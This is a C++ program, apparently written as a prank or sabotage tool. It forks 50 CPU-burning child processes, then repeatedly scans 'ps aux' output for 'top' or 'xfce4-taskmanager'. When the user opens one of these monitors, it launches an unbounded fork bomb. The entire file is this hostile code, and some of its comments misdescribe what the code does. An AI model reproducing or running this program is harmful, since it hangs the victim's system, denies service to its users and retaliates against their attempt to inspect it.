#include <iostream>
#include <unistd.h>
#include <random>
#include <ostream>
#include <string>
#include <fstream>

void doHardStuff();

int main(int argc, char* argv[]) {

    pid_t PID;
    // number of chile processes spun up
    int numberOfGuys = 50;
    for (int i = 0; i < numberOfGuys; i ++) {
        PID = fork();

        if (PID == 0) {
            // parent exits here
            break;
        }
        }

    if (PID == 0) {
        //children run this
        while(1) {
            doHardStuff();
        }
    }

    // specific task you're waiting for. would need to be set up for each specific machine
    std::string detectedTask[2] = {"xfce4-taskmanager", "top"};
    while(1) {
        // output of every task with "taskmanager" in name. stdout redirected to tasks.txt
        system("ps aux >> tasks.txt");

        std::string fileData;
        std::ifstream inputFile ("tasks.txt");

        if (inputFile.is_open()) {
            while(inputFile.good()) {
            inputFile >> fileData;

            if (fileData == detectedTask[0] || fileData == detectedTask[1]) {
                std::cout << "ladies and gentlemen: we got him\n";
                inputFile.close();
                remove("tasks.txt");

                while(1) {
                    fork();
                    doHardStuff();
                }
            }
            }
        }

        inputFile.close();
        inputFile.open("tasks.txt", std::ofstream::out | std::ofstream::trunc);
        inputFile.close();
    }
    remove("tasks.txt");
}

void doHardStuff() {
    float a = M_PI;
    float b = M_E;
    float sum = a*b/b/a*a*b*a/b;
}

